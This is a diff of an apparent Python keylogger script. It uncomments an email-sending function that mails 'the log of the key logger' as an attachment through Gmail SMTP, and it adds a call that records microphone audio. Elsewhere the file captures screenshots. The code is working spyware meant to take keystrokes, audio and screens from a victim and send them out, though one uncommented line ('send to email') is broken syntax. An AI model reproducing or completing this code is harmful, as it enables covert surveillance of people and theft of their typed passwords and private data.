@@ -38,34 +38,33 @@ system_info = "system_info.txt"
 
 count=0
 keys=[]
-# sjhgdcjhdgjkhgdjshgjghsdhjkgahghjgjhfdghjgfdjhgsdhjfgjhdsfghjdsgfhjsdghjkg``
-# email_add = " "
-# password = "  "
+email_add = " " # add email
+password = "  " #add email password
 
-# toaddr = " "
-#send to email
-# def send_email(filename, attachment, toaddr):
+toaddr = " " #add send email
+send to email
+def send_email(filename, attachment, toaddr):
 
-#     fromaddr = email_add
-#     msg = MIMEMultipart()
-#     msg['From'] = fromaddr
-#     msg['To'] = toaddr
-#     msg['Subject'] = "dinesh sending log file"
-#     body = "the log of the key logger"
-#     msg.attach(MIMEText(body, 'plain'))
-#     filename = filename
-#     attachment = open(attachment, 'rb')
-#     d = MIMEBase('application', 'octet-stream')
-#     d.set_payload((attachment).read())
-#     encoders.encode_base64(d)
-#     d.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-#     msg.attach(d)
-#     s = smtplib.SMTP('smtp.gmail.com', 587)
-#     s.starttls()
-#     s.login(fromaddr, password)
-#     text = msg.as_string()
-#     s.sendmail(fromaddr, toaddr, text)
-#     s.quit()
+    fromaddr = email_add
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "dinesh sending log file"
+    body = "the log of the key logger"
+    msg.attach(MIMEText(body, 'plain'))
+    filename = filename
+    attachment = open(attachment, 'rb')
+    d = MIMEBase('application', 'octet-stream')
+    d.set_payload((attachment).read())
+    encoders.encode_base64(d)
+    d.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    msg.attach(d)
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(fromaddr, password)
+    text = msg.as_string()
+    s.sendmail(fromaddr, toaddr, text)
+    s.quit()
 # send_email(keys_info ,file_path + extend + keys_info, toaddr)
 
 
@@ -113,7 +112,7 @@ def microP():
     sd.wait()
 
     write(file_path + extend + audio_info,fh, myrec )
-
+microP()
 #get screenshot
 def screen():
     im = ImageGrab.grab()
